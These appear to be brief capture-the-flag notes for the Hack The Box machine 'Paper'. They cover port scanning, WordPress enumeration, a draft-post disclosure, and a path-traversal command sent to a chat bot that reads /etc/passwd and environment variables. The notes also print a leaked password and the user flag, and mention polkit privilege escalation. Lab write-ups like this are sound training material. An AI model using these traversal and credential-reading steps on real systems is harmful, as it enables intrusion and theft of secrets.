# Enumeration
## Nmap
```bash
nmap -sC -sV -oA nmap/paper 10.10.11.143

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 1005ea5056a600cb1c9c93df5f83e064 (RSA)
|   256 588c821cc6632a83875c2f2b4f4dc379 (ECDSA)
|_  256 3178afd13bc42e9d604eeb5d03eca022 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: HTTP Server Test Page powered by CentOS
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: HTTP Server Test Page powered by CentOS
|_ssl-date: TLS randomness does not represent time
```

## Port 443
HTTP test page.

gobuster time.

```
gobuster dir -u http://10.10.11.143 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
```

Didn't find anything useful.

burp shows a header for `office.paper`

# Wordpress
version 5.2.3
```bash
wpscan --url http://office.paper/ -e ap --plugins-detection aggressive
```

5.2.3 lets you see draft pages:
```
?static=1
```

Found a link:
```
http://chat.office.paper/register/8qozr226AhkCHZdyY
```

Logging in shows a bot that has an lfi
```
recyclops file ../../../../../etc/passwd
```

getting /proc/self/eniron shows a pwd:
```
Queenofblad3s!23
```

# Shell as dwight
user.txt
```
4c3e375eadae72adf41d806c1ab15205
```

linpeas.sh -> polkit -> root
